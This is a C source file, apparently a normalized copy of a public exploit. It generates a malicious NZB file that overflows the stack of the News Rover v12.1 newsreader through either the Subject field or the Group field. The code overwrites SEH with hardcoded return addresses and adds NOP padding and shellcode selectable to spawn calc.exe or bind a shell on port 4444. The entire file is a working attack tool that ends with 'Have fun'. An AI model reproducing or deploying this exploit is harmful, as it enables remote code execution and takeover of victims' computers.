#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  FILE ;

/* Variables and functions */
 int FUNC0 (char*) ; 
 char* bindshellcode ; 
 char* calcshellcode ; 
 int /*<<< orphan*/  FUNC1 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/ * FUNC2 (char*,char*) ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ *,char*) ; 
 scalar_t__ FUNC4 (int) ; 
 int /*<<< orphan*/  FUNC5 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC6 (char*,char,int) ; 
 char* nzbend ; 
 char* nzbheader ; 
 int /*<<< orphan*/  FUNC7 (char*,...) ; 
 scalar_t__ FUNC8 (char*,int) ; 
 int FUNC9 (char*) ; 

int FUNC10(int argc, char* argv[]) {

FILE *file;
char * pad;
int type=0;
int mode=0;
char *filename;
char *myshell;

FUNC7("[+] NZB exploit for News Rover\n");
FUNC7("[+] Coded and discovered by Marsu <Marsupilamipowa@hotmail.fr>\n");
if (argc>3)	{
	type=FUNC0(argv[1]);
	filename=argv[3];
	mode=FUNC0(argv[2]);
	if (!mode)
		myshell=calcshellcode;
	else
		myshell=bindshellcode;
}
else {
	FUNC7("[+] Usage: %s type mode file.nzb\n\n",argv[0]);
	FUNC7("[+] type is ...\n");
	FUNC7("0: News Rover v12.1,  Rev. 1 Subject stack overflow. Works on XP SP2 FR\n");
	FUNC7("1: News Rover v12.1,  Rev. 1 Group stack overflow. Works on XP SP2 FR\n\n");
	FUNC7("[+] mode is \n");
	FUNC7("0: Spawns calc.exe\n");
	FUNC7("1: Binds to 4444\n\n");
	FUNC7("[+] Ex: %s 0 0 file.nzb",argv[0]);

	return 0;
}

file=FUNC2(filename,"wb");

if (type==0)
{
	FUNC3(file,nzbheader);
	FUNC3(file,"<file poster=\"Poster\" date=\"1170609233\"\nsubject=\"");
	pad = (char*)FUNC4(sizeof(char)*3000+FUNC9(myshell));
	FUNC6(pad,'A',3000);
	FUNC5(pad+2022,"\xeb\x15\x90\x90",4);  //jmp short +15
	FUNC5(pad+2026,"\x2a\x02\xfc\x7f",4);  //pop pop ret in ??? defeats SP2 SEH call protection. Have a look to your memory and change this address if it doesnt work.
	FUNC6(pad+2030,0x90,15);				//nop padding
	FUNC5(pad+2045,myshell,FUNC9(myshell));
	FUNC6(pad+2045+FUNC9(myshell),0,1);
	FUNC6(pad+3000,0,1);
	FUNC3(file,pad);
	FUNC3(file,"\">\n<groups><group>some group</group></groups>\n<segments>\n<segment bytes=\"30\" number=\"1\">some name");
	FUNC3(file,nzbend);
	FUNC1(file);
}
else if (type==1)
{
	FUNC3(file,nzbheader);
	FUNC3(file,"<file poster=\"Poster\" date=\"1170609233\" subject=\"Some Subj\">\n");
	FUNC3(file,"<groups><group>alt.bdffs</group></groups>\n<segments>\n<segment bytes=\"30\" number=\"1\">no matter the name</segment>\n</segments>\n</file>");
	FUNC3(file,"\n\n<file poster=\"Poster\" date=\"1170609233\" subject=\"Some Subj\">\n");
	FUNC3(file,"<groups><group>");
	
	pad = (char*)FUNC4(sizeof(char)*100);
	FUNC6(pad,'A',100);
	FUNC5(pad,"\x90\xb8\x33\x33\x33\x33\x2D\x13\x27\x33\x33\x8B\x04\x04\x40\xFF\xD0",17); //We will use data stuck in Segment to exec our code because we dont have much place here
	FUNC5(pad+94,"\x53\xF1\xD1\x77\00",5); //call ebx in USER32.dll
	FUNC3(file,pad);
	FUNC3(file,"</group></groups>\n<segments>\n<segment bytes=\"30\" number=\"1\">");
	pad=(char *)FUNC8(pad,sizeof(char)*3000);
	FUNC6(pad,'A',3000);
	FUNC5(pad+1500,myshell,FUNC9(myshell));
	FUNC6(pad+3000,0,1);
	FUNC3(file,pad);
	FUNC3(file,nzbend);
	FUNC1(file);
}


FUNC7("[+] File generated! Have fun\n");
return 0;
}